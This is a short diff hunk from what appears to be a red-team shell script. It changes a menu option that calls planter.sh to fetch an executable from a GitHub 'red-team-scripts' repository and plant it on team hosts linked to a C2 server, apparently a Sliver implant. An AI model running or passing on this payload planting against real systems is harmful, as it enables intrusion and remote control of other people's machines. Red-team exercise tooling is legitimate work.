@@ -377,7 +377,7 @@ while true; do
       if [[ ! -f "\$PLANTER" ]]; then
         echo "[-] planter.sh not found in \$SCRIPT_DIR"
       else
-        bash "\$PLANTER" -w "https://github.com/hyper-lang/sliver-binaries/raw/refs/heads/main/patch.zip" "\$TEAM" "\$C2_HOST"
+        bash "\$PLANTER" -w "https://github.com/smsmartbyu/red-team-scripts/raw/refs/heads/main/test/REASONABLE_NICETY.exe" "\$TEAM" "\$C2_HOST"
       fi ;;
     t|T)
       pick_host 0
